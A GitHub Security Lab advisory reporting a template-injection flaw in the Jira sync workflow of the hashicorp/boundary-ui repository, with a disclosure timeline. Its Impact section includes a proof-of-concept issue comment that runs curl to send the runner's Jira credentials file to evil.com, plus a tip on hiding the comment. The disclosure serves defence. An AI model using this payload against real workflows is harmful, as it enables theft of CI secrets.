<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">December 3, 2020</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-207: Template injection in a GitHub workflow of repository hashicorp/boundary-ui</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/jarlob">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/26652396?s=35" height="35" width="35">
        <span>Jaroslav Lobacevski</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="summary">Summary</h2>

<p>Automatic GitHub workflow in <a href="https://github.com/hashicorp/boundary-ui">hashicorp/boundary-ui</a> repository is vulnerable to template injection from user comments.</p>

<h2 id="product">Product</h2>

<p><a href="https://github.com/hashicorp/boundary-ui">hashicorp/boundary-ui</a> repository</p>

<h2 id="tested-version">Tested Version</h2>

<p>Main branch.</p>

<h2 id="details">Details</h2>

<h3 id="issue-hidden-expression-expansion-of-input-parameters-passed-to-atlassiangajira-comment">Issue: Hidden expression expansion of input parameters passed to <code class="language-plaintext highlighter-rouge">atlassian/gajira-comment</code></h3>

<p><a href="https://github.com/hashicorp/boundary-ui/blob/main/.github/workflows/jira.yml"><code class="language-plaintext highlighter-rouge">Sync comment</code> step in jira.yml</a> workflow is vulnerable to template injection.</p>

<p>The <code class="language-plaintext highlighter-rouge">${{ github.event.comment.body }}</code> is used to format input values to <code class="language-plaintext highlighter-rouge">atlassian/gajira-comment</code> action:</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">Sync comment</span>
  <span class="na">if</span><span class="pi">:</span> <span class="s">github.event.action == 'created' &amp;&amp; steps.search.outputs.issue</span>
  <span class="na">uses</span><span class="pi">:</span> <span class="s">atlassian/gajira-comment@v2.0.1</span>
  <span class="na">with</span><span class="pi">:</span>
    <span class="na">issue</span><span class="pi">:</span> <span class="s">${{ steps.search.outputs.issue }}</span>
    <span class="na">comment</span><span class="pi">:</span> <span class="s2">"</span><span class="s">${{</span><span class="nv"> </span><span class="s">github.actor</span><span class="nv"> </span><span class="s">}}</span><span class="nv"> </span><span class="s">${{</span><span class="nv"> </span><span class="s">github.event.review.state</span><span class="nv"> </span><span class="s">||</span><span class="nv"> </span><span class="s">'commented'</span><span class="nv"> </span><span class="s">}}:</span><span class="se">\n\n</span><span class="s">${{</span><span class="nv"> </span><span class="s">github.event.comment.body</span><span class="nv"> </span><span class="s">||</span><span class="nv"> </span><span class="s">github.event.review.body</span><span class="nv"> </span><span class="s">}}</span><span class="se">\n\n</span><span class="s">${{</span><span class="nv"> </span><span class="s">github.event.comment.html_url</span><span class="nv"> </span><span class="s">||</span><span class="nv"> </span><span class="s">github.event.review.html_url</span><span class="nv"> </span><span class="s">}}"</span>
</code></pre></div></div>

<p>However the Atlassian action has a hidden feature - it expands <code class="language-plaintext highlighter-rouge">{{}}</code> internally. This way when the comment body contains an expression in double curly braces it is evaluated by node.js in these actions.</p>

<h4 id="impact">Impact</h4>

<p>This vulnerability allows for arbitrary code execution in the context of GitHub runner. For example a user may comment on an issue with:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{{</span> <span class="nx">process</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">child_process</span><span class="dl">'</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="s2">`curl -d @</span><span class="p">${</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">HOME</span><span class="p">}</span><span class="s2">/.jira.d/credentials http://evil.com`</span><span class="p">)</span> <span class="p">}}</span>
</code></pre></div></div>

<p>which will exfiltrate the secret Jira API token to the attacker controlled server. To make the attack less visible an attacker may modify the comment to <code class="language-plaintext highlighter-rouge">Never mind my bad</code>.</p>

<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>

<ul>
  <li>10/29/2020: Report sent to vendor</li>
  <li>10/29/2020: Vendor acknowledges the issue</li>
  <li>10/29/2020: Vendor remediates the issue</li>
</ul>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/JarLob">@JarLob (Jaroslav Lobačevski)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2020-207</code> in any communication regarding this issue.</p>

   